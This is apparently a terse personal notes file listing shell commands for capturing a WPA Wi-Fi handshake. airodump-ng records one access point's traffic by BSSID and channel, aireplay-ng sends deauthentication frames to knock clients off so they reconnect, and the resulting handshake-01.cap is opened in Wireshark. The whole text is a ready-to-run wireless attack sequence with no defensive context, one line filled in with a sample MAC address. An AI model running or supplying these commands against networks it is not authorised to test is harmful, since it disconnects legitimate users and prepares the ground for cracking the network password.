sudo airodump-ng --bssid <AP MAC> -c <channel> -w handshake wlx8c902d61a1a4mon
sudo airodump-ng --bssid 78:8A:20:11:22:33 -c 6 -w handshake wlx8c902d61a1a4mon
reconnect device
sudo aireplay-ng --deauth 10 -a <AP MAC> wlx8c902d61a1a4mon
in shark
handshake-01.cap

